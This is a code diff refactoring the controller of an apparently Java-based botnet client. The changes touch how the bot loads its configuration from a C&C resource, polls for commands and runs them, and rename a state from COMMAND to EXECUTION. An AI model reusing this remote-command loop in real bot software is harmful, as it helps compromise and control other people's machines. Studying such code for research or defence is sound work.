@@ -45,10 +45,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import java.beans.IntrospectionException;
-import java.io.FileInputStream;
-import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.InputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
@@ -100,7 +97,7 @@ public class CoreController {
           joinBotnet();
           break;
 
-        case COMMAND:
+        case EXECUTION:
           BotCommand cmd = getNextCommand();
           executeCommands(cmd);
           break;
@@ -138,7 +135,13 @@ public class CoreController {
   public static void joinBotnet() throws BotException {
     LOGGER.traceEntry();
     final String initResource = AppConfigurationService.getConfigurations().getInitResource();
-    LOGGER.info("Connecting to C&C at {}...", initResource);
+    LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
+    try {
+      AppConfigurationService.loadJsonResource(initResource);
+    } catch (IOException exc) {
+      throw new BotException("Cannot load bot configuration C&C. Cause: {}", exc.getMessage());
+    }
+    /*
     try (InputStream in = new FileInputStream(initResource)) {
       LOGGER.info("Loading remote configuration...");
       AppConfigurationService.loadJson(in);
@@ -147,16 +150,17 @@ public class CoreController {
     } catch (IOException exc) {
       LOGGER.warn("Cannot close connection to C&C. Cause: {}", exc.getMessage());
     }
+    */
     allocateResources();
     LOGGER.info("Bot is up and running");
-    changeState(BotState.COMMAND);
+    changeState(BotState.EXECUTION);
     LOGGER.traceExit();
   }
 
   /**
-   * Executes the state `CMD`.
+   * Executes a command.
    * @param command the command to execute.
-   * @throws  BotException when errors during `CMD` state.
+   * @throws  BotException when errors during command execution.
    */
   public static void executeCommands(final BotCommand command) throws BotException {
     LOGGER.traceEntry("command={}", command);
@@ -230,13 +234,22 @@ public class CoreController {
   private static BotCommand getNextCommand() throws BotException {
     LOGGER.traceEntry();
     final String cmdResource = AppConfigurationService.getConfigurations().getCmdResource();
-    LOGGER.info("Polling command from {}", cmdResource);
+    LOGGER.info("Reading command from {}", cmdResource);
+    BotCommand cmd = null;
+    try {
+      cmd = BotCommandService.readFromJsonResource(cmdResource);
+    } catch (IOException exc) {
+      throw new BotException("Cannot read command");
+    }
+    /*
     BotCommand cmd;
     try (InputStream in = new FileInputStream(cmdResource)) {
-      cmd = BotCommandService.fromJson(in);
+      // cmd = BotCommandService.readFromJson(in);
+      cmd = BotCommandService.takeCommand(in);
     } catch (IOException exc) {
-      throw new BotException("Command resource unreachable. Cause %s", exc.getMessage());
+      throw new BotException("Command resource unreachable. Cause: %s", exc.getMessage());
     }
+    */
 
     return LOGGER.traceExit(cmd);
   }
@@ -249,9 +262,7 @@ public class CoreController {
     LOGGER.traceEntry("resource={}", resource);
     LOGGER.info("Restarting bot with resource {}...", resource);
     try {
-      try (InputStream in = new FileInputStream(resource)) {
-        AppConfigurationService.loadJson(in);
-      }
+      AppConfigurationService.loadJsonResource(resource);
     } catch (IOException exc) {
       throw new BotException("Cannot restart bot. Initialization resource cannot be read. Cause: %s", exc.getMessage());
     }
@@ -295,7 +306,7 @@ public class CoreController {
       LOGGER.trace(exc.getMessage());
     }
     LOGGER.info("Awake");
-    changeState(BotState.COMMAND);
+    changeState(BotState.EXECUTION);
     LOGGER.traceExit();
   }
 
@@ -342,7 +353,9 @@ public class CoreController {
    * Allocates bot's resources.
    */
   private static void allocateResources() {
+    LOGGER.traceEntry("Allocating resources...");
     POOL = new BotPool();
+    LOGGER.traceExit("Resources allocated");
   }
 
   /**
